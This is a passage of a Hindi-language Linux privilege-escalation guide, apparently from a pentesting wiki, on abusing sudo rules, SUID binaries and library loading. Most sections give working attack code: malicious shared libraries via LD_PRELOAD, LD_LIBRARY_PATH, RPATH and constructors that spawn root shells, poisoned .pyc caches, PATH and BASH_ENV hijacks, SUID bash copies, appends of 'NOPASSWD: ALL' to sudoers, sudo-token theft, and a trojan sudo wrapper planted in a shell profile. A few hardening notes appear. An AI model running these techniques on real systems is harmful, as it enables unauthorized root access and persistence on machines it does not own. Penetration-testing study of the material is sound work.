यदि caller यह चुन सकता है कि कौन-सा `.3mf` project slice किया जाए, तो `prusaslicer` या `prusa-slicer` के लिए unrestricted root-capable sudo grant की समीक्षा की जानी चाहिए। किसी project में post-processing script हो सकती है, जो G-code export होने पर चलती है; crafted projects, 2.6.1 तक PrusaSlicer में commands चला सकते हैं ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268))। यह निष्कर्ष निकालने से पहले कि privilege boundary तक पहुँचा जा सकता है, प्रभावी sudo rule, binary version और vendor patches, project source, तथा यह पुष्टि करें कि संबंधित export path चलता है या नहीं। निश्चित project argument या प्रभावी `NOEXEC` policy परिणाम बदल सकती है। केवल slicer का installed होना privilege escalation path स्थापित नहीं करता।

### SETENV

यह directive उपयोगकर्ता को कुछ execute करते समय **environment variable set करने** की अनुमति देता है:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

यह उदाहरण, **HTB मशीन Admirer पर आधारित**, root के रूप में script निष्पादित करते समय arbitrary python library लोड करने के लिए **PYTHONPATH hijacking** के प्रति **vulnerable** था:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo-allowed Python imports में writable `__pycache__` / `.pyc` poisoning

अगर कोई **sudo-allowed Python script** ऐसे module को import करती है जिसके package directory में **writable `__pycache__`** है, तो आप cached `.pyc` को बदलकर अगले import पर privileged user के रूप में code execution पा सकते हैं।<sup>[[30]](#references)</sup>

- यह क्यों काम करता है:
  - CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में रखता है।<sup>[[31]](#references)</sup>
  - Interpreter **header** (magic + source से जुड़े timestamp/hash metadata) को validate करता है, फिर उसके बाद stored marshaled code object को execute करता है।
  - अगर directory writable होने के कारण आप cached file को **delete और recreate** कर सकते हैं, तो root-owned लेकिन non-writable `.pyc` को भी replace किया जा सकता है।
- आम तरीका:
  - `sudo -l` में कोई Python script या wrapper दिखता है जिसे आप root के रूप में चला सकते हैं।
  - वह script `/opt/app/`, `/usr/local/lib/...` आदि से local module import करती है।
  - Imported module की `__pycache__` directory आपके user या सभी के लिए writable है।

तुरंत enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

यदि आप privileged script की जाँच कर सकते हैं, तो import किए गए modules और उनका cache path पहचानें:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

दुरुपयोग का कार्यप्रवाह:

1. `sudo` की अनुमति वाली स्क्रिप्ट एक बार चलाएँ, ताकि Python वैध cache फ़ाइल बना दे, अगर वह पहले से मौजूद न हो।
2. वैध `.pyc` से पहले 16 bytes पढ़ें और उन्हें दूषित फ़ाइल में फिर से इस्तेमाल करें।
3. एक payload code object compile करें, उसे `marshal.dumps(...)` से serialize करें, मूल cache फ़ाइल हटाएँ, और मूल header तथा अपने malicious bytecode को जोड़कर उसे फिर से बनाएँ।
4. `sudo` की अनुमति वाली स्क्रिप्ट फिर से चलाएँ, ताकि import आपका payload root के रूप में execute करे।

महत्वपूर्ण नोट्स:

- मूल header को फिर से इस्तेमाल करना अहम है, क्योंकि Python cache metadata की जाँच source फ़ाइल से करता है—यह नहीं देखता कि bytecode body वास्तव में source से मेल खाती है या नहीं।
- यह खास तौर पर तब उपयोगी है, जब source फ़ाइल root के स्वामित्व में हो और writable न हो, लेकिन उसमें मौजूद `__pycache__` डायरेक्टरी writable हो।
- `PYTHONDONTWRITEBYTECODE=1` और `python -B` Python को नई `.pyc` फ़ाइलें लिखने से रोकते हैं; वे पहले से मौजूद, हमलावर द्वारा बदली गई cache को लोड करने से **नहीं** रोकते। अहम सीमा यह है कि क्या कम privileges वाला उपयोगकर्ता ऐसी cache को बदल सकता है जिसे privileged import स्वीकार करेगा। Python cached bytecode लोड करने से पहले timestamp/size या hash metadata की जाँच करता है। [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) और [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) देखें।

न्यूनतम proof-of-concept का स्वरूप:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

सुरक्षा सुदृढ़ीकरण:

- सुनिश्चित करें कि privileged Python import path की कोई भी directory कम privileges वाले users द्वारा writable न हो, इसमें `__pycache__` भी शामिल है।
- मौजूदा `.pyc` files सहित cache-directory के ownership और permissions का audit करें। Bytecode writes को बंद करने से नए cache बनने कम हो सकते हैं, लेकिन इससे पहले से मौजूद और बदली जा सकने वाली cache निष्प्रभावी नहीं होती।
- Writable local Python modules और writable cache directories को उसी तरह लें, जैसे root द्वारा चलाए जाने वाले writable shell scripts या shared libraries को लेते हैं।

### sudo env_keep के ज़रिए BASH_ENV सुरक्षित रखा गया → root shell

अगर sudoers `BASH_ENV` को सुरक्षित रखता है (उदाहरण के लिए, `Defaults env_keep+="ENV BASH_ENV"`), तो किसी अनुमत command को चलाते समय arbitrary code को root के रूप में चलाने के लिए Bash के non-interactive startup व्यवहार का लाभ उठाया जा सकता है।<sup>[[24]](#references)</sup>

- यह क्यों काम करता है: Non-interactive shells के लिए, Bash target script चलाने से पहले `$BASH_ENV` का मूल्यांकन करता है और उस file को source करता है। कई sudo rules किसी script या shell wrapper को चलाने की अनुमति देते हैं। अगर sudo द्वारा `BASH_ENV` सुरक्षित रखा जाता है, तो आपकी file root privileges के साथ source होती है।<sup>[[23]](#references)</sup>

- आवश्यकताएँ:
  - ऐसा sudo rule जिसे आप चला सकते हों (कोई भी target जो `/bin/bash` को non-interactively चलाता हो, या कोई bash script)।
  - `BASH_ENV` का `env_keep` में होना (`sudo -l` से जाँचें)।

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
  - sudo-अनुमत commands के लिए shell wrappers से बचें; न्यूनतम binaries का उपयोग करें।
  - सुरक्षित रखे गए env vars के उपयोग पर sudo I/O logging और alerting पर विचार करें।

### sudo के ज़रिए Terraform, सुरक्षित रखे गए HOME के साथ (!env_reset)

जब sudo किसी अधिक विशेषाधिकार वाले user के रूप में Terraform चलाने की अनुमति देता है, तो `!env_reset` इस बात की जाँच करने का संकेत है कि उस विशिष्ट rule में वास्तव में कौन-से environment variables बने रहते हैं। Caller द्वारा लिखे जा सकने वाले `.terraformrc` या `terraform.rc` को सक्रिय CLI configuration मानने से पहले, प्रभावी `HOME` या `TF_CLI_CONFIG_FILE` की पुष्टि करें। `provider_installation.dev_overrides` entry तभी मायने रखती है जब निश्चित Terraform command उस provider को load करे और caller चुनी गई directory में उसका executable रख सके।<sup>[[25]](#references)</sup>

- ज़रूरी provider को लिखने योग्य directory पर point करें और provider के नाम पर malicious plugin रखें (जैसे, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform Go plugin handshake में विफल हो जाएगा, लेकिन बंद होने से पहले payload को root के रूप में execute करता है और पीछे एक SUID shell छोड़ देता है।

### TF_VAR overrides + symlink validation bypass

अगर sudo का विशिष्ट नियम उन्हें सुरक्षित रखता है, तो Terraform variables `TF_VAR_<name>` environment variables के ज़रिए दिए जा सकते हैं। Source-symlink से **read** करने के लिए ऐसे provider की भी ज़रूरत होती है जो link को follow करे और सुरक्षित नतीजे को caller द्वारा पढ़े जा सकने वाले destination पर copy करे। Destination-symlink से **write** करने के लिए अलग से caller के नियंत्रण वाली destination entry और ऐसा privileged provider चाहिए जो write करते समय उसे follow करे; बाद में चलने वाला scheduled job इसका केवल एक संभावित नतीजा है। इनमें से किसी भी तरीके को आज़माने से पहले, केवल पढ़ने वाले commands जैसे `sudo -l`, `stat` और `readlink` से सटीक sudo grant, संबंधित `.tf` files, चुना हुआ CLI config और paths का ownership जाँचें। `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` जैसे कमज़ोर lexical validations symlinks को resolve नहीं करते:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform symlink को resolve करता है और वास्तविक `/root/root.txt` को ऐसी destination में कॉपी करता है जिसे attacker पढ़ सकता है। इसी तरीके का उपयोग privileged paths में **लिखने** के लिए भी किया जा सकता है, जैसे destination symlinks पहले से बनाकर (उदाहरण के लिए, provider के destination path को `/etc/cron.d/` के अंदर की ओर इंगित करना)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से चलाने के लिए बाध्य करता है। यदि `!requiretty` सेट है (या यह विकल्प मौजूद नहीं है), तो sudo को reverse shells, cron jobs या scripts जैसे non-interactive contexts से चलाया जा सकता है।

```bash
Defaults !requiretty
```

यह अपने आप में कोई सीधी vulnerability नहीं है, लेकिन इससे वे स्थितियाँ बढ़ जाती हैं जिनमें पूर्ण PTY की आवश्यकता के बिना sudo rules का दुरुपयोग किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` या attacker-writable entries (जैसे `/home/<user>/bin`) वाला `secure_path` दिखता है, तो sudo-अनुमत target के भीतर किसी unqualified external command को shadow किया जा सकता है।<sup>[[3]](#references)</sup> प्रभावी `secure_path` मौजूद न होना भी जाँचने लायक है **यदि** command का sudo environment caller-controlled `PATH` को बनाए रखता है; केवल इसका मौजूद न होना यह साबित नहीं करता कि ऐसा होता है। अनुमत script को चलाए बिना पढ़ें, फिर सटीक RunAs और argument rule, प्रभावी command search path, और command के नाम वाली ऐसी पहले खोजी जाने वाली directory की पुष्टि करें जिस पर लिखने और traversing की अनुमति हो। Authentication, `NOEXEC`, shell builtins और absolute command paths परिणाम बदल सकते हैं।

- आवश्यकताएँ: ऐसा sudo rule (अक्सर `NOPASSWD`) जो ऐसी script/binary चलाता हो जो absolute paths के बिना commands (`free`, `df`, `ps` आदि) को call करती हो, और `PATH` की ऐसी writable entry जिसे सबसे पहले खोजा जाता हो।

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo के जरिए paths को bypass करना
**Jump** करके अन्य files पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए, sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path के

अगर **sudo permission** किसी एक command को **path बताए बिना** दी गई है: _hacker10 ALL= (root) less_, तो PATH variable बदलकर इसका exploit किया जा सकता है.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

इस technique का उपयोग तब भी किया जा सकता है, जब कोई **suid** binary **किसी command को उसका path बताए बिना execute करती है (किसी अजीब SUID binary के content को हमेशा** _**strings**_ **से check करें)**।

[Execute करने के लिए payload examples।](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Command path वाली SUID binary

अगर **suid** binary **किसी command को उसका path बताकर execute करती है**, तो आप उस command के नाम से **function export** करने की कोशिश कर सकते हैं, जिसे suid file call कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ को call करती है, तो आपको function बनाने और उसे export करने की कोशिश करनी होगी:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

फिर, जब आप suid binary को कॉल करेंगे, तो यह function execute होगा

### Custom SUID copy wrappers

Root-owned SUID utility, जो source और destination paths स्वीकार करती है, दो अलग-अलग trust boundaries को पार कर सकती है। अगर यह किसी argument से shell command बनाती है (उदाहरण के लिए, `system()` को बनाया गया `cp` command पास करके), तो shell metacharacters इसके effective privileges के साथ कोई दूसरा command execute कर सकते हैं। भले ही यह shell के बिना `cp` को सुरक्षित तरीके से चलाए, unrestricted destination के कारण `/etc/passwd` जैसी files में मनमाना privileged write संभव हो सकता है। Wrapper के argument handling, effective UID behavior, destination restrictions और इस बात की जाँच करें कि copied file में caller-controlled contents बने रहते हैं या नहीं; सामान्य `cp` error या SUID bit अकेले इनमें से किसी भी path का प्रमाण नहीं है। किसी भी manual testing से पहले binary और permissions को passive तरीके से enumerate करें।

### SUID wrapper द्वारा execute की जाने वाली writable script

एक आम custom-app misconfiguration में root-owned SUID binary wrapper एक script execute करता है, जबकि वह script low-priv users द्वारा writable होती है।

सामान्य pattern:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

यदि `/usr/local/bin/backup.sh` writable है, तो आप payload commands जोड़ सकते हैं और फिर SUID wrapper execute कर सकते हैं:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

त्वरित जाँच:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

यह attack path `/usr/local/bin` में उपलब्ध "maintenance"/"backup" wrappers में विशेष रूप से आम है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग loader को एक या अधिक shared libraries (.so files) निर्दिष्ट करने के लिए किया जाता है, जिन्हें वह बाकी सभी libraries से पहले लोड करता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library को preload करना कहते हैं।

हालाँकि, system security बनाए रखने और इस सुविधा के दुरुपयोग को रोकने के लिए, विशेष रूप से **suid/sgid** executables के साथ, system कुछ शर्तें लागू करता है:

- यदि real user ID (_ruid_) effective user ID (_euid_) से मेल नहीं खाती, तो loader executables के लिए **LD_PRELOAD** को अनदेखा करता है।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद ऐसी libraries preload की जाती हैं जिनमें suid/sgid भी सेट हो।

यदि आप `sudo` से commands चलाने में सक्षम हैं और `sudo -l` के output में **env_keep+=LD_PRELOAD** कथन शामिल है, तो privilege escalation हो सकता है। यह configuration **LD_PRELOAD** environment variable को बने रहने और `sudo` से commands चलाने पर भी पहचाने जाने देती है, जिससे elevated privileges के साथ arbitrary code चलाया जा सकता है।<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

इस रूप में सहेजें **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

इसके बाद इसे **compile** करें:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

अंत में, **escalate privileges** चलाते हुए

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, तो इसी तरह के privesc का दुरुपयोग किया जा सकता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

जब **SUID** permissions वाली कोई binary असामान्य लगे, तो यह जाँचना अच्छा अभ्यास है कि वह **.so** files को सही तरीके से load कर रही है या नहीं। इसे निम्न command चलाकर जाँचा जा सकता है:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर exploitation की संभावना का संकेत मिलता है।

इसका exploitation करने के लिए, कोई C फ़ाइल बनाएगा, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित code होगा:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

यह कोड, compile और execute किए जाने के बाद, file permissions में बदलाव करके और elevated privileges के साथ shell execute करके privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दी गई C फ़ाइल को shared object (.so) फ़ाइल में compile करें:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

अंत में, प्रभावित SUID बाइनरी चलाने से exploit ट्रिगर होना चाहिए, जिससे सिस्टम से संभावित रूप से समझौता हो सकता है।

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

अब जबकि हमें ऐसी SUID binary मिल गई है जो उस folder से library लोड करती है जिसमें हम लिख सकते हैं, तो उस folder में आवश्यक नाम वाली library बनाते हैं:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

यदि आपको इस तरह की कोई त्रुटि मिले:

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

इसका मतलब है कि आपके द्वारा बनाई गई library में `a_function_name` नाम का एक function होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated list है, जिनका इस्तेमाल attacker स्थानीय सुरक्षा प्रतिबंधों को bypass करने के लिए कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी यही है, लेकिन उन मामलों के लिए जहाँ आप किसी command में **केवल arguments inject कर सकते हैं**।

यह project Unix binaries के वैध functions इकट्ठा करता है, जिनका दुरुपयोग restricted shells से बाहर निकलने, elevated privileges बढ़ाने या बनाए रखने, files transfer करने, bind और reverse shells spawn करने, तथा अन्य post-exploitation tasks को आसान बनाने के लिए किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आपके पास `sudo -l` चलाने की अनुमति है, तो आप [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool का इस्तेमाल करके जाँच सकते हैं कि क्या वह किसी sudo rule का exploit ढूँढ़ता है।

### Sudo Tokens का दोबारा इस्तेमाल

ऐसी स्थिति में जहाँ आपके पास **sudo access** है, लेकिन password नहीं है, आप **sudo command के execute होने का इंतज़ार करके और फिर session token hijack करके** privileges बढ़ा सकते हैं।<sup>[[18]](#references)</sup>

Privileges बढ़ाने की आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell है
- "_sampleuser_" ने **पिछले 15 मिनट में** कुछ execute करने के लिए `sudo` का इस्तेमाल किया हो (डिफ़ॉल्ट रूप से sudo token की अवधि इतनी होती है, जो हमें password डाले बिना `sudo` इस्तेमाल करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का परिणाम 0 हो
- `gdb` उपलब्ध हो (आप उसे upload कर सकें)

(आप `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` चलाकर `ptrace_scope` को अस्थायी रूप से enable कर सकते हैं, या `/etc/sysctl.d/10-ptrace.conf` में बदलाव करके और `kernel.yama.ptrace_scope = 0` सेट करके इसे स्थायी रूप से enable कर सकते हैं।)

अगर ये सभी आवश्यकताएँ पूरी होती हैं, तो आप privileges बढ़ाने के लिए इसका इस्तेमाल कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला exploit** (`exploit.sh`) _/tmp_ में `activate_sudo_token` binary बनाएगा। आप इसका इस्तेमाल **अपने session में sudo token activate करने के लिए** कर सकते हैं (आपको अपने-आप root shell नहीं मिलेगा; `sudo su` चलाएँ):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में **root के स्वामित्व वाला setuid युक्त sh shell** बनाएगा

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers file बनाएगा**, जो **sudo tokens को अनंतकालिक बना देगा और सभी users को sudo इस्तेमाल करने की अनुमति देगा**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

यदि आपके पास फ़ोल्डर में या उसके अंदर बनाई गई किसी फ़ाइल पर **लेखन अनुमतियाँ** हैं, तो आप किसी user और PID के लिए **sudo token बनाने** के लिए binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग कर सकते हैं।\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 वाला shell है, तो आप password जाने बिना **sudo privileges प्राप्त** कर सकते हैं:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। इन फ़ाइलों को **डिफ़ॉल्ट रूप से केवल user root और group root ही पढ़ सकते हैं**।\
**अगर** आप इस फ़ाइल को **पढ़** सकते हैं, तो आपको **कुछ दिलचस्प जानकारी मिल सकती है**, और अगर आप किसी भी फ़ाइल में **लिख** सकते हैं, तो आप **privileges escalate** कर पाएँगे।

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

यदि आपको लिखने की अनुमति है, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

इन अनुमतियों का दुरुपयोग करने का एक और तरीका:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

`sudo` binary के कुछ विकल्प भी हैं, जैसे OpenBSD के लिए `doas`। इसकी configuration `/etc/doas.conf` में जाँचना याद रखें।

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

अगर `doas` किसी editor या interpreter को अनुमति देता है, तो GTFOBins-जैसे escapes जाँचें:

```bash
doas vim
:!/bin/sh
```

एक root-capable `doas` rule के लिए original Python-based `dstat` के plugin path की भी समीक्षा करना उचित है। इसके [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) और [source](https://github.com/dstat-real/dstat/blob/master/dstat) में `dstat_*.py` plugins के स्थानों में `/usr/share/dstat/` और `/usr/local/share/dstat/` शामिल हैं। यदि वर्तमान user उस location में write और search कर सकता है जिसे installed build वास्तव में इस्तेमाल करता है, तो चुना गया plugin `doas` की RunAs identity के साथ चल सकता है। प्रभावी rule, उस build में plugin lookup, directory और parent permissions या ACLs, और यह पुष्टि करें कि caller कोई plugin चुन सकता है या नहीं; केवल `dstat` rule या writable directory होना एक संकेत भर है। `dstat` के अन्य implementations अलग plugin systems इस्तेमाल कर सकते हैं। Plugin लोड किए बिना metadata को निष्क्रिय रूप से जांचें।

### Sudo Hijacking

यदि आपको पता है कि कोई **user आम तौर पर किसी machine से connect करता है और privileges बढ़ाने के लिए `sudo` इस्तेमाल करता है**, और आपको उस user context में shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं**, जो आपका code root के रूप में और फिर user की command चलाएगा। इसके बाद, **user context का $PATH बदलें** (उदाहरण के लिए, `.bash_profile` में नया path जोड़कर), ताकि user के `sudo` चलाने पर आपका sudo executable चले।

ध्यान दें कि यदि user कोई दूसरा shell इस्तेमाल करता है (bash नहीं), तो नया path जोड़ने के लिए आपको अन्य files बदलनी होंगी। उदाहरण के लिए, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को बदलता है। एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में मिल सकता है।

या कुछ ऐसा चलाकर:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है कि **लोड की गई configuration files कहाँ से आती हैं**। आमतौर पर, इस फ़ाइल में यह path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` की configuration files पढ़ी जाएँगी। ये configuration files **अन्य folders की ओर संकेत करती हैं**, जहाँ **libraries** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि system `/usr/local/lib` के अंदर libraries खोजेगा**।

अगर किसी कारण से **किसी user के पास** इनमें से किसी path पर write permissions हैं: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर की कोई भी फ़ाइल, या `/etc/ld.so.conf.d/*.conf` के अंदर configuration file में दिया गया कोई भी folder, तो वह privileges escalate कर सकता है।\
इस misconfiguration का **शोषण कैसे करें**, यह जानने के लिए यह page देखें:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib` को `/var/tmp/flag15/` में कॉपी करने पर, `RPATH` variable में निर्दिष्ट इस स्थान की `lib` को प्रोग्राम इस्तेमाल करेगा।

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

इसके बाद `/var/tmp` में इस कमांड से एक malicious library बनाएं:

`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

